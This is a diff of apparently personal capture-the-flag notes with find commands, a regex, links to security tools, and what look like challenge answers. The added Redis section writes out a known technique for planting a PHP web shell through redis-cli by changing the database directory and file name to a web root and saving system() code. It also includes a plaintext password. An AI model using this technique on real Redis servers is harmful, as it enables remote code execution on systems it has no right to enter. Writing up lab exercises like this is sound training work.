@@ -55,12 +55,34 @@ $ ln -s ./fuse0 ./fuse1
 
 1. find /some/directory -size +5k -size -10k
 
-1. regex101 for regex related questions  
+1. regex101.com for regex related questions  
 \b([a-fA-F0-9]{2}-){5}[a-fA-F0-9]{2}\b
 d3-a3-44-d3-d3-d3
 
 1. uncompress
 
+1. Redis cli
 
+redis-cli --raw -a R3disp@ss -h localhost 
+R3disp@ss
+redis-cli -h localhost
+config set dir /var/www/html
+config set dbfilename maintenance.php 
+set test "<?php phpinfo(); ?>"
+save
+set test "<?php system('ls') ?>"
 
+756-8347
+redis-cli -
+https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
 
+1. Op3nTheD00r
+
+1. hiD - light.conf
+
+#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
+
+1. https://docs.splunk.com/Splexicon:Index
+https://github.com/redcanaryco/atomic-red-team
+
+1. decoder https://gchq.github.io/CyberChef/
